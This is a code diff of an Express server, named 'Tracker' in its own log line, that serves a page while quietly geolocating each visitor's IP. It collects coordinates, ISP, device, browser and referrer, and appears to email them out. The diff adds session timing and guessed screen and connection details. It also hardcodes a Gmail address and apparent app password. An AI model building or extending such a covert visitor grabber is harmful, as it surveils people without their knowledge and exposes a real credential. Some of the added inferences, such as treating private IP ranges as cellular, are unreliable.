@@ -6,12 +6,22 @@ const app = express();
 
 app.set('trust proxy', true);
 
+const sessionStarts = {};
+
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: process.env.EMAIL_USER || 'staysane.rz@gmail.com',
     pass: process.env.EMAIL_PASS || 'nvkq cudo ibhh usdr'
   }
+});
+
+app.use((req, res, next) => {
+  const ip = req.ip;
+  if (!sessionStarts[ip]) {
+    sessionStarts[ip] = new Date();
+  }
+  next();
 });
 
 app.get('/', async (req, res) => {
@@ -25,10 +35,14 @@ app.get('/', async (req, res) => {
   const os = parser.getOS();
   const browser = parser.getBrowser();
 
-  const deviceBrand = device.vendor || 'Unknown brand';
-  const deviceModel = device.model || 'Unknown model';
-  const osInfo = `${os.name || 'OS'} ${os.version || ''}`.trim();
-  const browserInfo = `${browser.name || 'Browser'} ${browser.version || ''}`.trim();
+  const screenResolution = getApproximateResolution(device.model || userAgent);
+
+  const connectionType = inferConnectionType(req);
+
+  const sessionStart = sessionStarts[ip];
+  const sessionDuration = sessionStart 
+    ? `${(new Date() - sessionStart) / 1000} seconds` 
+    : 'First visit';
 
   let location = 'Unknown';
   let coordinates = 'N/A';
@@ -38,7 +52,6 @@ app.get('/', async (req, res) => {
   try {
     const geo = await axios.get(`http://ip-api.com/json/${ip}`);
     const { city, regionName, country, isp, lat, lon, timezone: tz } = geo.data;
-
     location = `${city}, ${regionName}, ${country} (ISP: ${isp})`;
     coordinates = `{Latitude, Longitude}: ${lat}, ${lon}`;
     timezone = tz || 'N/A';
@@ -64,10 +77,14 @@ Reverse Geocoded Address: ${geoAddress}
 Coordinates: ${coordinates}
 Timezone: ${timezone}
 
-Device Brand: ${deviceBrand}
-Device Model: ${deviceModel}
-OS: ${osInfo}
-Browser: ${browserInfo}
+Device Brand: ${device.vendor || 'Unknown brand'}
+Device Model: ${device.model || 'Unknown model'}
+OS: ${os.name || 'OS'} ${os.version || ''}
+Browser: ${browser.name || 'Browser'} ${browser.version || ''}
+
+Approx. Screen Resolution: ${screenResolution}
+Inferred Connection Type: ${connectionType}
+Session Duration: ${sessionDuration}
 
 User Agent: ${userAgent}
 Referrer: ${referrer}`
@@ -79,6 +96,25 @@ Referrer: ${referrer}`
 
   res.sendFile(__dirname + '/index.html');
 });
+
+function getApproximateResolution(deviceModel) {
+  const resolutions = {
+    'iPhone': '750x1334',      
+    'iPad': '1536x2048',       
+    'Macintosh': '1440x900',  
+    'Windows': '1920x1080',    
+    'Android': '1080x1920'     
+  };
+  return resolutions[deviceModel] || 'Unknown';
+}
+
+function inferConnectionType(req) {
+  const ip = req.ip;
+  if (ip.startsWith('192.0.0.') || ip.startsWith('172.16.')) {
+    return 'Likely Mobile (Cellular)';
+  }
+  return 'Likely WiFi/Landline';
+}
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Tracker running on port ${PORT}`));
